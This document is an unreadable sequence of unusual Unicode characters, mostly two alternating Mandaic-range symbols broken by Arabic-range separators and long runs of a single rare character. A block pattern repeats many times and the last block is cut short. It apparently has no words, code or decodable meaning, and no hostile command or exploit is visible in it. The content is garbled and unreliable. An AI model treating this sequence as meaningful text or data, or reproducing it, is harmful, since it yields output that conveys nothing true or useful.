࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬